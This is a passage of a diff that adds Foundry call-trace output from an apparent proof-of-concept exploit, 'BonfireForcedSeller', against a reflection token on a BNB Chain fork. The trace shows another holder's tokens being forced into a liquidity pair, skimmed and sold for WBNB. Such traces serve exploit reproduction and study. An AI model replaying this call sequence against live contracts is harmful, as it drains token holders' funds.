+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 4501845528432791411063 [4.501e21]
+    │   │   ├─ [29100] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::swap(8324567341530369545 [8.324e18], 0, BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   ├─ [13946] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transfer(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 8324567341530369545 [8.324e18])
+    │   │   │   │   ├─ emit Transfer(from: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 7492110607377332591 [7.492e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a923f0a9bc4d329a13c07d7d4e13991684b23474f31acf505e38bbd98dd04e0 → 0x4a91dbce3d340805bfdb8522a82e32f79159e3fd8075a75f0689e43b581b2f5d
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00d1a1c5560c501491cd1214889bbe7c82d009e10ff99ef3465664e53732425d → 0x00d1fb1544c1d3b4dca45c1146023ae3350e305654982f3b09db742ee0589e02
+    │   │   │   │   │   @ 10: 0xb5e5c5e92f08263f2584cc1b44189bbe3cf1910d1ca2fa14b970807752d0eb88 → 0xb5e5c0f2f71a827d5a402fbf0c7256a4aa9804a2d7943f6d9b86345b07032e99
+    │   │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x000793cc0588247649bd72b0c64d63c1c0f65b9335357c6746469c9bec4666ce → 0x000798c23d75c83815020f0cfdf3a8db534fe7fd7a44370e6430e8b8381423bd
+    │   │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000000485cf589aa9da8c643b8 → 0x00000000000000000000000000000000000000000000485cfb50681c45cfae05
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 409954893797695207983235 [4.099e23]
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   │   ├─ emit Sync(reserve0: 409954893797695207983235 [4.099e23], reserve1: 5865040887934810179567 [5.865e21])
+    │   │   │   ├─ emit Swap(sender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount0In: 8344342140233262454 [8.344e18], amount1In: 0, amount0Out: 8324567341530369545 [8.324e18], amount1Out: 0, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056cfb2c0a1d008067116 → 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056cfb306e2e324374883
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 4509339515955192063302 [4.509e21]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007386cde444bc4e09
+    │   ├─ [6222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0x1Aa7202824a667783Be76b64d4d38a74a322f604) [staticcall]
+    │   │   └─ ← [Return] 9826255026317148182 [9.826e18]
+    │   ├─ [86526] 0x17e801E17CeFC6334059189c178D4783830E03D3::transfer(0x1Aa7202824a667783Be76b64d4d38a74a322f604, 8844138239216892382 [8.844e18], BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1789463732 [1.789e9])
+    │   │   ├─ [24235] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transferFrom(0x1Aa7202824a667783Be76b64d4d38a74a322f604, 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, 8844138239216892382 [8.844e18])
+    │   │   │   ├─ emit Transfer(from: 0x1Aa7202824a667783Be76b64d4d38a74a322f604, to: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, amount: 7959724415295203144 [7.959e18])
+    │   │   │   ├─ emit Approval(owner: 0x1Aa7202824a667783Be76b64d4d38a74a322f604, spender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount: 115792089237316195423570985008687907853269984665640564039448739869673912747553 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xde4c6842f52ec9d5bd1f922eb3979f9a30f2969e3d93137a32bbf6b1d6f7ebe8: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffffff85434f2133074621
+    │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x000798c23d75c83815020f0cfdf3a8db534fe7fd7a44370e6430e8b8381423bd → 0x00079e07bcd3e7dcc605735bcfbf9af8a6a28db1d50c85d3413954c037f4c6b6
+    │   │   │   │   @ 0x4658fb6a5f495f8093ed3af985131b929a402bcc621f472d466346913b737b3b: 0x000075231be9fbcd0eeeaa06bbb2c34a8ec13a469e02181376df3c653498eeff → 0x00000bb5288f82ef3aa91c114247324f66818b8923043150464e38e9a05536f5
+    │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a91dbce3d340805bfdb8522a82e32f79159e3fd8075a75f0689e43b581b2f5d → 0x4a923ab131d2419a321a4a7a7e01dfb812f4475245e2f0987d0a0fa6ec9da175
+    │   │   │   │   @ 10: 0xb5e5c0f2f71a827d5a402fbf0c7256a4aa9804a2d7943f6d9b86345b07032e99 → 0xb5e5bbad77bc62d8a93ccb703aa6648757455eee7ccbf0a8be7dc85307228ba0
+    │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000000485cfb50681c45cfae05 → 0x00000000000000000000000000000000000000000000485d017370f43675b750
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056cfb306e2e32437488300000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 409963034810598144877230 [4.099e23]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 409963034810598144877230 [4.099e23]
+    │   │   ├─ [557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056cfb306e2e32437488300000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [366] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::totalSupply() [staticcall]
+    │   │   │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    │   │   ├─ [2703] 0xf33D46ecBB9fEdF80F8fEeBa8eb9d3c1053d3f91::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 409963034810598144877230 [4.099e23], 5865040887934810179567 [5.865e21], 409954893797695207983235 [4.099e23], 5, 1000000000000000000000000 [1e24], 2) [staticcall]
+    │   │   │   ├─ [1848] 0x122f7B4504DdFf2151636811fC9E6DB066f6d437::computeSwapAmountsWithReflection(5865040887934810179567 [5.865e21], 409963034810598144877230 [4.099e23], 5865040887934810179567 [5.865e21], 409954893797695207983235 [4.099e23], 5, 1000000000000000000000000 [1e24], 2) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000731081b6d9a359bf
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000731081b6d9a359bf
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 4509341510017176184850 [4.509e21]
+    │   │   ├─ [29100] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::swap(8291269536324475327 [8.291e18], 0, BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   ├─ [13946] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transfer(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 8291269536324475327 [8.291e18])
+    │   │   │   │   ├─ emit Transfer(from: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 7462142582692027795 [7.462e18])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a923ab131d2419a321a4a7a7e01dfb812f4475245e2f0987d0a0fa6ec9da175 → 0x4a91d7da768722933ae2146937479a332aecdabb7ec7205d04a64bcd20fcd963
+    │   │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x00079e07bcd3e7dcc605735bcfbf9af8a6a28db1d50c85d3413954c037f4c6b6 → 0x0007a2f8dfcadc9d1f2e5c4bfe8e1c1dbfa817463e473760d5d9b873f3d6642a
+    │   │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00d1fb1544c1d3b4dca45c1146023ae3350e305654982f3b09db742ee0589e02 → 0x00d25409ba1f093b218ac0422f1f7e1deb0a89c4493e9c5b58fe70a134362b2c
+    │   │   │   │   │   @ 10: 0xb5e5bbad77bc62d8a93ccb703aa6648757455eee7ccbf0a8be7dc85307228ba0 → 0xb5e5b6bc54c56e185013e2800bd7e3623e3fd55a13913f1b29dd649f4b40ee2c
+    │   │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000000485d017370f43675b750 → 0x00000000000000000000000000000000000000000000485d0734443d5af11566
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 409954913493396096118435 [4.099e23]
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   │   ├─ emit Sync(reserve0: 409954913493396096118435 [4.099e23], reserve1: 5865040887934810179567 [5.865e21])
+    │   │   │   ├─ emit Swap(sender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount0In: 8310965237212610527 [8.31e18], amount1In: 0, amount0Out: 8291269536324475327 [8.291e18], amount1Out: 0, to: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056cfb306e2e324374883 → 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056cfb34cdc05db416ea3
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   └─ ← [Return] 4516805525102470801854 [4.516e21]
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000731081b6d9a359bf
+    │   ├─ [24608] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::approve(0x17e801E17CeFC6334059189c178D4783830E03D3, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─ emit Approval(owner: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xb048960de25b96c347b89b6e93d5606a21d1606fa68ce00215532355817e8c9d: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 4516805525102470801854 [4.516e21]
+    │   ├─ [95648] 0x17e801E17CeFC6334059189c178D4783830E03D3::sell(2450000000000000000000 [2.45e21], 0, BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1789463732 [1.789e9])
+    │   │   ├─ [16635] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transferFrom(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, 2450000000000000000000 [2.45e21])
+    │   │   │   ├─ emit Transfer(from: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, amount: 2205000000000000000000 [2.205e21])
+    │   │   │   ├─ emit Approval(owner: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount: 115792089237316195423570985008687907853269984665640564037007584007913129639935 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x0007a2f8dfcadc9d1f2e5c4bfe8e1c1dbfa817463e473760d5d9b873f3d6642a → 0x000d5745e00bc7869b11bdfee23655d73820fdab4e4ac76bd1c144dc36b6642a
+    │   │   │   │   @ 11: 0x00000000000000000000000000000000000000000000485d0734443d5af11566 → 0x000000000000000000000000000000000000000000004863ab3bb134f44b1566
+    │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4a91d7da768722933ae2146937479a332aecdabb7ec7205d04a64bcd20fcd963 → 0x4af885447b17a6fdf0def2fd391ba93da36d0dd69f074122baee2b21d4bcd963
+    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00d25409ba1f093b218ac0422f1f7e1deb0a89c4493e9c5b58fe70a134362b2c → 0x00603e05b50caefd73c71e4865fafba0819889df08f75b7faae7787bfab62b2c
+    │   │   │   │   @ 10: 0xb5e5b6bc54c56e185013e2800bd7e3623e3fd55a13913f1b29dd649f4b40ee2c → 0xb5e0026f5484832ed43080cd282fa9a8c5c6eef5038daf102df5d8370860ee2c
+    │   │   │   │   @ 0xb048960de25b96c347b89b6e93d5606a21d1606fa68ce00215532355817e8c9d: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xffffffffffffffffffffffffffffffffffffffffffffff7b2f6b7ca804f7ffff
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 412210409268531491226111 [4.122e23]
+    │   │   ├─ [557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   └─ ← [Return] 5865040887934810179567 [5.865e21]
+    │   │   ├─ [494] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000056cfb34cdc05db416ea300000000000000000000000000000000000000000000013df1cafd421ff9c7ef000000000000000000000000000000000000000000000000000000006aa90cb4
+    │   │   ├─ [2082] 0xf33D46ecBB9fEdF80F8fEeBa8eb9d3c1053d3f91::computeSwapAmounts(412210409268531491226111 [4.122e23], 5865040887934810179567 [5.865e21], 409954913493396096118435 [4.099e23], 5865040887934810179567 [5.865e21], 2) [staticcall]
+    │   │   │   ├─ [1239] 0x122f7B4504DdFf2151636811fC9E6DB066f6d437::computeSwapAmounts(412210409268531491226111 [4.122e23], 5865040887934810179567 [5.865e21], 409954913493396096118435 [4.099e23], 5865040887934810179567 [5.865e21], 2) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001bc78f57a3dcbf597
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001bc78f57a3dcbf597
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [2534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x17e801E17CeFC6334059189c178D4783830E03D3) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ [41127] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::swap(0, 32027618655416874391 [3.202e19], 0x17e801E17CeFC6334059189c178D4783830E03D3, 0x)
+    │   │   │   ├─ [25962] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::transfer(0x17e801E17CeFC6334059189c178D4783830E03D3, 32027618655416874391 [3.202e19])
+    │   │   │   │   ├─ emit Transfer(from: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, to: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount: 32027618655416874391 [3.202e19])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x00000000000000000000000000000000000000000000013df1cafd421ff9c7ef → 0x00000000000000000000000000000000000000000000013c355207c7e22dd258
+    │   │   │   │   │   @ 0xaa69c5c9adc5493731f0b4241589ddbda7c362ecbb172acf617ee5e0bd2f1d76: 0 → 0x000000000000000000000000000000000000000000000001bc78f57a3dcbf597
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 412210409268531491226111 [4.122e23]
+    │   │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2) [staticcall]
+    │   │   │   │   └─ ← [Return] 5833013269279393305176 [5.833e21]
+    │   │   │   ├─ emit Sync(reserve0: 412210409268531491226111 [4.122e23], reserve1: 5833013269279393305176 [5.833e21])
+    │   │   │   ├─ emit Swap(sender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount0In: 2255495775135395107676 [2.255e21], amount1In: 0, amount0Out: 0, amount1Out: 32027618655416874391 [3.202e19], to: 0x17e801E17CeFC6334059189c178D4783830E03D3)
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x6aa90cb400000000013df1cafd421ff9c7ef0000000056cfb34cdc05db416ea3 → 0x6aa90cb400000000013c355207c7e22dd258000000005749f8978d6136cfc1ff
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [557] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token1() [staticcall]
+    │   │   │   └─ ← [Return] 0x000000000000000000000000bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c
+    │   │   ├─ [534] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::balanceOf(0x17e801E17CeFC6334059189c178D4783830E03D3) [staticcall]
+    │   │   │   └─ ← [Return] 32027618655416874391 [3.202e19]
+    │   │   ├─ [9195] 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c::withdraw(32027618655416874391 [3.202e19])
+    │   │   │   ├─ [55] 0x17e801E17CeFC6334059189c178D4783830E03D3::fallback{value: 32027618655416874391}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit Withdrawal(src: 0x17e801E17CeFC6334059189c178D4783830E03D3, wad: 32027618655416874391 [3.202e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xaa69c5c9adc5493731f0b4241589ddbda7c362ecbb172acf617ee5e0bd2f1d76: 0x000000000000000000000000000000000000000000000001bc78f57a3dcbf597 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [55] BonfireForcedSeller::receive{value: 32027618655416874391}()
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001bc78f57a3dcbf597
+    │   ├─ [2222] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::balanceOf(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   └─ ← [Return] 2067058739798096068623 [2.067e21]
+    │   ├─ [90848] 0x17e801E17CeFC6334059189c178D4783830E03D3::sell(2067058739798096068623 [2.067e21], 0, BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1789463732 [1.789e9])
+    │   │   ├─ [16635] 0x5e90253fbae4Dab78aa351f4E6fed08A64AB5590::transferFrom(BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, 2067058739798096068623 [2.067e21])
+    │   │   │   ├─ emit Transfer(from: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2, amount: 1860352865818286461761 [1.86e21])
+    │   │   │   ├─ emit Approval(owner: BonfireForcedSeller: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: 0x17e801E17CeFC6334059189c178D4783830E03D3, amount: 115792089237316195423570985008687907853269984665640564034940525268115033571312 [1.157e77])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x00603e05b50caefd73c71e4865fafba0819889df08f75b7faae7787bfab62b2c → 0x0000000000000000000045748bfcaa6099add201698c228fd44cb4ae287db7fd
+    │   │   │   │   @ 11: 0x000000000000000000000000000000000000000000004863ab3bb134f44b1566 → 0x000000000000000000000000000000000000000000004869458b15cfd4e62bcd
+    │   │   │   │   @ 10: 0xb5e0026f5484832ed43080cd282fa9a8c5c6eef5038daf102df5d8370860ee2c → 0xb5db3288a510ada228004a241aa2fb00242366c8619e04ca4dc928a7190da7a5
+    │   │   │   │   @ 0x0e70f7349d87c30a3bb207941a643cb71811eac6aa218ed7bbfaa27889f37af8: 0x4af885447b17a6fdf0def2fd391ba93da36d0dd69f074122baee2b21d4bcd963 → 0x4b4f237cd13caae20c455e7ef8009d2c4810b55afa932586d12f8fcfc84ebf84
+    │   │   │   │   @ 0xb048960de25b96c347b89b6e93d5606a21d1606fa68ce00215532355817e8c9d: 0xffffffffffffffffffffffffffffffffffffffffffffff7b2f6b7ca804f7ffff → 0xffffffffffffffffffffffffffffffffffffffffffffff0b2137a08e78da3ff0
+    │   │   │   │   @ 0xd506f4495fb33e52df08a8807e5e6a6ddb260b96689d8a7265416641576e1ef3: 0x000d5745e00bc7869b11bdfee23655d73820fdab4e4ac76bd1c144dc36b6642a → 0x0012272c8f7f9d134741f4a7efc3047fd9c485d7f03a71b1b1edf46c2609aab1
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
+    │   │   ├─ [426] 0xD3F478F0d5E98b01f757bc6cB54Db4C00b9838f2::token0() [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000005e90253fbae4dab78aa351f4e6fed08a64ab5590
